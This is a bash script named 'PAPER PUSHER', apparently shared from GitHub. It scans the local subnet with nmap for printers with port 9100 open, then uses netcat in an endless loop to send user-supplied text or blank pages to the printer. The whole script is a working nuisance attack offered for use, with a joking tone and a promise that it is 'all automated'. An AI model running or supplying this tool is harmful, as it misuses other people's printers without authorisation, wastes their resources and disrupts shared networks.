#!/bin/bash
# PAPER PUSHER
# Nmap scans the LAN subnet and finds paper printers with port 9100 open and sends spam to be printed via RAW printing with Netcat. The script assumes that the subnet netmask is: 255.255.255.0. All automated, just run the script, sit back, and relax.
# If you have multiple printers on the LAN it might break the script. I don't have multiple printers, so I can't test it, *shrugs*.
# Dependencies: Linux, nmap, netcat.
# Shout out to SpuriousIndices aka the Printer God, for teaching me how to mess with printers.

echo "
         https://github.com/OSINTI4L
  ,----,------------------------------,------.
  | ## |         PAPER PUSHER         |    - |
  | ## |                              |    - |
  |    |------------------------------|    - |
  |    ||............................||      |
  |    ||.-                        -.||      |
  |    ||___                      ___||    ##|
  |    ||---=--------------------=---||      |
  |--mb||_|______________________==__||------'
  "
  
# Gathering LAN subnet IP address:
echo -e "Gathering subnet IP address..\n"
sleep 1
subnet=$(hostname -I | awk '{print $1}' | awk -F'.' '{print $1"."$2"."$3}')
echo -e "Subnet: $subnet found!\nPresumed netmask: 255.255.255.0\n"
sleep 1
# Subnet scan for port 9100:
echo "Scanning subnet: $subnet.0/24.."
IP=$(nmap $subnet.0/24 -p 9100 --open | awk '/Nmap scan report/ {print $5}')


if [[ -n $IP ]]; then
	echo -e "🖨 Printer found at: $IP, port 9100 exposed. 🖨\n"
	sleep 1
	echo -e "Enter the text to be printed\n(leave blank to dispense blank pages)"
	read -p "Enter text: " printtext
	sleep 1
		while true
		do
		echo -e "\nSending commands to printer (∩ ° ʖ °)⊃━☆ﾟ.   *.*.*.*.*.*\n(Ctrl+C to stop)\n"
 		echo -e "$printtext\n\f" | nc -q 1 $IP 9100
 		echo "Commands sent successfully! ☚ (<‿<)☚"
		done
else
	echo "No printers found with port 9100 exposed ¯\_(ツ)_/¯ exiting."
fi
